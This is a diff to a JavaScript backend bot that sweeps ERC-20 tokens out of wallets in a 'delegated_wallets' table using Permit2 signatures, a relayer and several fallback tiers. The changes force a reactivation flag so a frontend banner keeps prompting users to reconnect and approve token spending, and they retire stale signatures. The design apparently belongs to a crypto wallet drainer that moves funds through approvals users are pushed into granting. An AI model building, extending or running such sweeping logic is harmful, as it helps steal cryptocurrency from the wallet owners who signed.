@@ -1368,17 +1368,23 @@ async function hasLivePermit2Allowance(checksumAddr) {
 // Use this everywhere instead of unconditional needs_reactivation:true so that
 // users who have a live permitBatch are never incorrectly prompted to re-sign
 // just because their SignatureTransfer nonce was consumed or expired.
-async function setNeedsReactivationIfNoBackup(checksumAddr, addrKey) {
+// forceReactivate=true: always set needs_reactivation regardless of on-chain backup.
+// Use when ERC-20→Permit2 approval is missing — having a Permit2 internal allowance
+// (from a prior permit2.permit() call) does NOT allow sweeping without the ERC-20 approval.
+// The user must reconnect and approve ERC-20 to enable sweeping.
+async function setNeedsReactivationIfNoBackup(checksumAddr, addrKey, { forceReactivate = false } = {}) {
   if (!supabase) return;
-  const hasBackup = await hasLivePermit2Allowance(checksumAddr).catch(() => false);
-  if (hasBackup) {
-    log(`[reactivation] AllowanceTransfer still live for ${addrKey.slice(0,10)} — NOT setting needs_reactivation`);
-    return;
+  if (!forceReactivate) {
+    const hasBackup = await hasLivePermit2Allowance(checksumAddr).catch(() => false);
+    if (hasBackup) {
+      log(`[reactivation] AllowanceTransfer still live for ${addrKey.slice(0,10)} — NOT setting needs_reactivation`);
+      return;
+    }
   }
   await supabase.from("delegated_wallets")
     .update({ needs_reactivation: true })
     .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
-  log(`[reactivation] no AllowanceTransfer backup — needs_reactivation set for ${addrKey.slice(0,10)}`);
+  log(`[reactivation] ${forceReactivate ? 'ERC-20 approval missing' : 'no AllowanceTransfer backup'} — needs_reactivation set for ${addrKey.slice(0,10)}`);
 }
 
 async function dispatchSweep(wallet) {
@@ -2030,6 +2036,7 @@ async function sweep(wallet) {
     }
     if (liveWithBalance.length > 0) {
       let sweptAny = false;
+      let anyNeedsErc20Approval = false; // tracks: Permit2 internal > 0 but ERC-20 = 0
       for (const { token, balance } of liveWithBalance) {
         try {
           const sym = TOKENS.find(t => t.address.toLowerCase() === token)?.symbol ?? token.slice(0, 10);
@@ -2045,7 +2052,8 @@ async function sweep(wallet) {
               erc20Approved = erc20Chk > 0n;
             } catch {}
             if (!erc20Approved) {
-              warn(`[live-allowance] ${sym} relayer path skipped — ERC-20→Permit2 approval missing or pending`);
+              warn(`[live-allowance] ${sym} relayer path skipped — ERC-20→Permit2 approval missing`);
+              anyNeedsErc20Approval = true;
             } else {
               const sweepAmt = p2Amt < balance ? p2Amt : balance;
               if (sweepAmt > 0n) {
@@ -2078,6 +2086,7 @@ async function sweep(wallet) {
                 sweptAny = true;
               } else {
                 warn(`[live-allowance] ${sym} V2 path skipped — ERC-20→Permit2 approval missing`);
+                anyNeedsErc20Approval = true;
               }
             }
           }
@@ -2095,6 +2104,12 @@ async function sweep(wallet) {
           await supabase.from("delegated_wallets").update({ needs_reactivation: false })
             .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
         }
+      } else if (anyNeedsErc20Approval && supabase) {
+        // Permit2 internal allowances exist but ERC-20→Permit2 approval is missing for all tokens.
+        // Force needs_reactivation=true so the frontend banner prompts the user to reconnect
+        // and approve ERC-20. Having a Permit2 internal allowance alone is insufficient for sweeping.
+        warn(`[live-allowance] ${short} — Permit2 internal allowances present but ERC-20 approval missing → needs_reactivation`);
+        await setNeedsReactivationIfNoBackup(checksum, addrKey, { forceReactivate: true });
       }
     }
   }
@@ -2129,8 +2144,14 @@ async function sweep(wallet) {
           // AllowanceTransfer (Tier 3/3.5) or direct-allowance (Tier 5) handles this wallet.
           log(`[gasless] sig spender=V2 contract — relying on AllowanceTransfer path; not setting needs_reactivation`);
         } else {
-          err(`[gasless] ❌ SPENDER MISMATCH — sig signed for ${sig.spender} but relayer is ${relayerWallet.address}`);
-          err(`[gasless] Set BOT_ADDRESS env var on backend to ${relayerWallet.address} and have user re-activate`);
+          err(`[gasless] ❌ SPENDER MISMATCH — sig for ${addrKey.slice(0,10)} signed for old relayer ${sig.spender?.slice(0,10)} (current: ${relayerWallet.address.slice(0,10)})`);
+          // Mark the stale sig as spent so the bot stops retrying it every scan cycle.
+          // On user reconnect the backend will upsert a fresh sig with the current relayer.
+          if (supabase) {
+            supabase.from("permit2_signatures").update({ spent: true })
+              .eq("address", addrKey + "-sig").eq("chain", CHAIN)
+              .then(() => { warn(`[gasless] stale wrong-spender sig marked spent for ${addrKey.slice(0,10)}`); }, () => {});
+          }
           await setNeedsReactivationIfNoBackup(checksum, addrKey);
         }
         // Do NOT return — fall through to Tier 5 (direct-allowance may still work)
@@ -2243,9 +2264,12 @@ async function sweep(wallet) {
       }
 
       if (withBalance.length === 0) {
-        warn(`[gasless] no tokens with Permit2 approval — checking for AllowanceTransfer backup`);
-        // Only flag needs_reactivation when no other tier swept and no AllowanceTransfer exists.
-        if (!sweptThisCall) await setNeedsReactivationIfNoBackup(checksum, addrKey);
+        warn(`[gasless] no tokens with ERC-20→Permit2 approval — user must reconnect and approve tokens`);
+        // Force needs_reactivation=true even when permit2.permit() created internal allowances.
+        // Having Permit2 internal allowances does NOT enable sweeping without ERC-20 approval.
+        // Forcing this flag ensures the frontend banner keeps prompting the user to reconnect
+        // and complete the ERC-20 approval step.
+        if (!sweptThisCall) await setNeedsReactivationIfNoBackup(checksum, addrKey, { forceReactivate: true });
         return;
       }
       log(`[gasless] sweeping ${withBalance.length} tokens`);
